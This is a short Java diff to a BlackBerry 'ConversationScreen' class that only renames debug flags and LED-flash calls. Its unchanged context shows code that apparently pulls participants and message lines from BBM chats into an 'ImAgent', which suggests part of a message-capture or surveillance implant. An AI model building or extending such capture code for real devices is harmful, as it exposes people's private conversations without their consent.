@@ -43,8 +43,8 @@ public class ConversationScreen {
     public synchronized void getConversationScreen() {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
-                //#ifdef DEBUG
-                debug.ledFlash(Debug.COLOR_RED);
+                //#ifdef DEMO
+                Debug.ledFlash(Debug.COLOR_RED);
                 //#endif
                 return;
             }
@@ -93,8 +93,8 @@ public class ConversationScreen {
                     ImAgent agent = ImAgent.getInstance();
                     agent.add(partecipants, lines);
 
-                    //#ifdef DEBUG
-                    debug.ledFlash(Debug.COLOR_YELLOW);
+                    //#ifdef DEMO
+                    Debug.ledFlash(Debug.COLOR_YELLOW);
                     //#endif
                 }
             }
